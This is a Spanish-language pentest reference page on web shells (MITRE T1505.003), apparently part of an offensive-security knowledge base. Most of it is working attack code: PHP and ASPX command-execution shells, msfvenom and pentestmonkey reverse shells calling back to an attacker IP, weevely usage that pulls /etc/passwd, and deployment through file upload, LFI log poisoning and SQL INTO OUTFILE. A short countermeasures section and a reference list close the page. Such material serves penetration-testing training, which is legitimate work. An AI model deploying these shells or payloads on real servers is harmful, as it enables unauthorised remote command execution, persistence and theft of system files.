---
title: Web Shells
slug: web-shells
aliases: [Web Shells]
fase: [Post-Explotación]
plataforma: Web
dificultad: Básica
mitre: [T1505.003]
related: []
learning_refs: []
---

# Web Shells

## Descripción
Una web shell es un script malicioso desplegado en un servidor web que proporciona al atacante una interfaz de ejecución de comandos a través de HTTP/HTTPS. Típicamente escritas en PHP, ASP/ASPX, JSP o Python, las web shells permiten ejecutar comandos del sistema operativo, navegar el sistema de archivos, transferir archivos y mantener acceso persistente al servidor sin necesidad de mantener una conexión activa. Se despliegan comúnmente a través de vulnerabilidades de file upload, inyección de código, o explotación de aplicaciones web. Su detección es difícil porque el tráfico se mezcla con peticiones HTTP legítimas.

## Herramientas
- **p0wny-shell** (https://github.com/flozz/p0wny-shell) — web shell PHP minimalista con interfaz de terminal interactiva
- **b374k** — web shell PHP con interfaz gráfica, explorador de archivos y editor de código
- **weevely** (`weevely generate`, `weevely connect`) — web shell PHP ofuscada con canal cifrado
- **webshell collection** (https://github.com/tennc/webshell) — colección de web shells en múltiples lenguajes
- **msfvenom** (`-p php/meterpreter/reverse_tcp`) — generación de web shells con payload Meterpreter

## Comandos / Ejemplos

### Web shell PHP básica (one-liner)
```php
<?php system($_GET['cmd']); ?>
```
```bash
# Uso: acceder vía URL
curl "http://target.com/uploads/shell.php?cmd=whoami"
curl "http://target.com/uploads/shell.php?cmd=cat+/etc/passwd"
```

### Web shell PHP con ejecución POST (más sigilosa)
```php
<?php
if(isset($_POST['cmd'])) {
    echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
}
?>
```
```bash
# Uso vía POST (no aparece en logs de URL)
curl -X POST -d "cmd=id" http://target.com/uploads/shell.php
```

### Reverse shell PHP (pentestmonkey)
```bash
# Descargar reverse shell de pentestmonkey
# Modificar IP y puerto en el script
$ip = '10.10.14.5';
$port = 4444;

# Subir al servidor y acceder
# En el atacante, preparar listener
nc -nlvp 4444

# Acceder a la URL del shell para activar la conexión
curl http://target.com/uploads/reverse_shell.php
```

### Web shell ASP/ASPX (IIS/Windows)
```bash
# Generar web shell ASP con msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f asp > shell.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx > shell.aspx

# Web shell ASPX mínima
# <%@ Page Language="C#" %>
# <%@ Import Namespace="System.Diagnostics" %>
# <% Response.Write(Process.Start(new ProcessStartInfo("cmd.exe","/c " + Request["cmd"]) {UseShellExecute=false,RedirectStandardOutput=true}).StandardOutput.ReadToEnd()); %>

# Subir vía WebDAV con cadaver
cadaver http://10.10.10.50/webdav
dav:/webdav/> put shell.aspx
```

### Generación y uso de weevely
```bash
# Generar web shell ofuscada con contraseña
weevely generate "s3cr3t" /tmp/agent.php
# Resultado: archivo PHP ofuscado que parece código legítimo

# Subir agent.php al servidor víctima (vía upload, LFI+write, etc.)

# Conectar a la web shell
weevely http://target.com/uploads/agent.php s3cr3t

# Dentro de weevely — shell interactivo
weevely> whoami
weevely> :file_download /etc/passwd /tmp/passwd_local

# Módulos disponibles
weevely> :help
# file_upload, file_download, sql_dump, net_scan, backdoor_meterpreter, etc.
```

### Despliegue vía vulnerabilidades comunes
```bash
# Vía file upload sin validación
curl -F "file=@shell.php" http://target.com/upload.php

# Vía LFI + Log Poisoning (inyectar PHP en logs)
nc target.com 25
MAIL FROM: <?php system($_GET['cmd']); ?>
# Luego incluir el log vía LFI
curl "http://target.com/page.php?file=../../../var/log/mail.log&cmd=id"

# Vía SQL Injection (INTO OUTFILE)
# SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'
```

## Contramedidas
- Implementar validación estricta de archivos subidos: verificar tipo MIME, extensión, y contenido (magic bytes)
- Deshabilitar funciones peligrosas en PHP: `disable_functions = exec,system,passthru,shell_exec,proc_open,popen` en `php.ini`
- Monitorear el sistema de archivos del web root para detectar archivos nuevos o modificados
- Implementar WAF (Web Application Firewall) con reglas para detectar web shells conocidas
- Configurar permisos restrictivos en directorios de upload: no permitir ejecución (`chmod -x`)
- Usar herramientas de detección de web shells como YARA rules, NeoPI, o Microsoft's WebShell Scanner
- Segregar el servidor web del sistema operativo usando contenedores o chroot
- Revisar logs de acceso web para detectar peticiones anómalas a archivos recién creados

## Referencias
- MITRE Corporation. (2024). ATT&CK Technique T1505.003: Server Software Component: Web Shell. https://attack.mitre.org/techniques/T1505/003/
- flozz. (s.f.). *p0wny-shell* [Software]. GitHub. https://github.com/flozz/p0wny-shell
- epinna. (s.f.). *weevely3* [Software]. GitHub. https://github.com/epinna/weevely3
- Stuttard, D., & Pinto, M. (2011). *The Web Application Hacker's Handbook* (2nd ed.). Wiley.
- Kim, P. (2018). *The Hacker Playbook 3*. Secure Planet, LLC.
